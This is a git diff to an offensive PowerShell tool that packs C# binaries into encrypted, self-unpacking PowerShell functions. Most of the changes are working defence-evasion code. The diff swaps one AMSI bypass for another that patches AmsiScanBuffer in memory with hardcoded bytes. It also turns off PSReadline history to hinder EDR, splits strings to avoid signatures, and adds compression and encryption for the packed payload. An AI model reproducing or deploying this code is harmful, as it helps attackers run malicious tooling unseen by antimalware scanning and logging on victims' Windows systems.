@@ -4,7 +4,7 @@ function ConvertTo-Powershell
 .SYNOPSIS
 
 Creates powershell wrapper for a C# console application. This allows you to call a powershell function (Invoke-YourBinaryName), which internally unwraps the binary and calls
-a predefined function. The .ps1 file is encrypted by default and contains a standard bypass for AMSI. Use "-NoEncryption" to just use base64.
+a predefined function. The .ps1 file is encrypted by default and contains a standard bypass for AMSI. Use "-NoProtection" if you do NOT want encryption and AMSI bypass.
 
 Author: Christoph Falta (@cfalta)
 
@@ -39,6 +39,12 @@ Used to build a string in the form of [namespace.class]::function("....") inside
 .PARAMETER Function
 
 Used to build a string in the form of [namespace.class]::function("....") inside the generated powershell function. This will be the command that actually calls your c# code from powershell.
+
+
+.PARAMETER NoProtection
+
+Do not use encryption and do not include an AMSI bypass in the result. If you use this parameter, the output ps1 will just include a bas64 encoded version of the source wrapped in a function. Default is "false".
+
 
 .EXAMPLE
 
@@ -94,7 +100,7 @@ Param (
     [Parameter(Mandatory = $False)]
     [ValidateNotNullorEmpty()]
     [Switch]
-    $NoEncryption = $false
+    $NoProtection = $false
     )
 
 $filename = (Get-Item -LiteralPath $Path).name
@@ -118,60 +124,39 @@ else {
 }
 
 
-$AMSIBypass2=@"
+$AMSIBypass=@"
 using System;
 using System.Runtime.InteropServices;
 
-namespace RandomNamespace
-{
-    public class RandomClass
-    {
-        [DllImport("kernel32")]
-        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-        [DllImport("kernel32")]
-        public static extern IntPtr LoadLibrary(string name);
-        [DllImport("kernel32")]
-        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+public class foo {
 
-        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
-        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
-        public static void RandomFunction()
-        {
-            IntPtr TargetDLL = LoadLibrary("amsi.dll");
-            IntPtr TotallyNotThatBufferYouRLookingForPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
 
-            UIntPtr dwSize = (UIntPtr)5;
-            uint Zero = 0;
-         
-            VirtualProtect(TotallyNotThatBufferYouRLookingForPtr, dwSize, 0x40, out Zero);
-            Byte[] one = { 0x31 };
-            Byte[] two = { 0xff, 0x90 };
-            int length = one.Length + two.Length;
-            byte[] sum = new byte[length];
-            one.CopyTo(sum,0);
-            two.CopyTo(sum,one.Length);
-            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
-             Marshal.Copy(sum, 0, unmanagedPointer, 3);
-             MoveMemory(TotallyNotThatBufferYouRLookingForPtr + 0x001b, unmanagedPointer, 3);
-        }
-    }
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 }
 "@
-$AMSIBypass2encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($AMSIBypass2))
+$AMSIBypassencoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($AMSIBypass))
+
 
 $BypassStub=@"
+#Might help against certain EDRs...
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
 
-(([Ref].Assembly.gettypes() | where {`$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {`$_.Name -like "amsiInit*ailed"}).SetValue(`$null,`$true)
-
-`$SomeEncodedStuff = "$AMSIBypass2encoded"
-`$SomeDecodedStuff = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$SomeEncodedStuff))
-
-Add-Type -TypeDefinition `$SomeDecodedStuff
-
-[RandomNamespace.RandomClass]::RandomFunction()
-
+#AMSI
+`$AMSIBypassencoded = "$AMSIBypassencoded"
+`$niw32 = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$AMSIBypassencoded))
+Add-Type -TypeDefinition `$niw32
+`$l = [foo]::LoadLibrary("am" + "si.dll")
+`$a = [foo]::GetProcAddress(`$l, "Amsi" + "Scan" + "Buffer")
+`$p = 0
+`$null = [foo]::VirtualProtect(`$a, [uint32]5, 0x40, [ref]`$p)
+`$pa = [Byte[]] (184, 87, 0, 7, 128, 195)
+[System.Runtime.InteropServices.Marshal]::Copy(`$pa, 0, `$a, 6)
 "@
 
 $FunctionHeader=@"
@@ -179,7 +164,7 @@ function Invoke-$functionname([string]`$Command)
 {
 "@
 
-$FunctionBodyNoEncryption=@"
+$FunctionBodyNoProtection=@"
 `$Message="$file"
 "@
 
@@ -195,7 +180,9 @@ $DecryptionStub=@"
 
 `$AES = [System.Security.Cryptography.Aes]::Create()
 
-`$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes(`"$Password`"),[Text.Encoding]::ASCII.GetBytes(`"$Salt`"),"SHA256",5)
+`$v1=[Text.Encoding]::ASCII.GetBytes(`"$Password`")
+`$v2=[Text.Encoding]::ASCII.GetBytes(`"$Salt`")
+`$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes(`$v1,`$v2,"SHA512",10)
 
 `$AES.Padding = "PKCS7"
 `$AES.KeySize = 256
@@ -226,11 +213,11 @@ if((Test-Path -LiteralPath $Outpath))
     Remove-Item -LiteralPath $Outpath -Force
 }
 
-if($NoEncryption)
+if($NoProtection)
 {
 
     Add-Content $Outpath $FunctionHeader
-    Add-Content $Outpath $FunctionBodyNoEncryption
+    Add-Content $Outpath $FunctionBodyNoProtection
     Add-Content $Outpath $FunctionTrailer
 
 }
@@ -310,14 +297,19 @@ Encrypts the message "Hello World" and returns the result as a custom psobject.
         [Parameter(Position = 2, Mandatory = $False)]
         [ValidateNotNullorEmpty()]
         [String]
-        $Salt
+        $Salt,
+
+        [Parameter(Position = 3, Mandatory = $False)]
+        [ValidateNotNullorEmpty()]
+        [Switch]
+        $Compression
     )
 
 #Create a new instance of the .NET AES provider
 $AES = [System.Security.Cryptography.Aes]::Create()
 
 #Derive an encryption key from the password and the salt
-$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes($Password),[Text.Encoding]::ASCII.GetBytes($Salt),"SHA256",5)
+$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes($Password),[Text.Encoding]::ASCII.GetBytes($Salt),"SHA512",10)
 
 #The AES instance automatically creates an IV. This is stored in a separate variable for later use.
 $IV = $AES.IV
@@ -337,8 +329,22 @@ $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStre
 #Conver the message to a byte array
 $MessageBytes = [System.Text.Encoding]::ASCII.GetBytes($Message)
 
+if($Compression)
+{
+#Compress before encryption
+    $CompressedStream = New-Object IO.MemoryStream
+    $DeflateStream = New-Object IO.Compression.GzipStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+    $DeflateStream.Write($MessageBytes, 0, $MessageBytes.Length)
+    $DeflateStream.Dispose()
+    $CompressedBytes = $CompressedStream.ToArray()
+    $CompressedStream.Dispose()
+}
+else {
+    $CompressedBytes = $MessageBytes
+}
+
 #Encrypt the message using cryptostream
-$CryptoStream.Write($MessageBytes,0,$MessageBytes.Length)
+$CryptoStream.Write($CompressedBytes,0,$CompressedBytes.Length)
 $CryptoStream.FlushFinalBlock()
 
 #Get the ciphertext as byte array
@@ -357,6 +363,7 @@ $CryptoResult | Add-Member -MemberType NoteProperty -Name "Ciphertext" -Value ([
 return($CryptoResult)
 
 }
+
 
 function Get-EntryPoint
 {
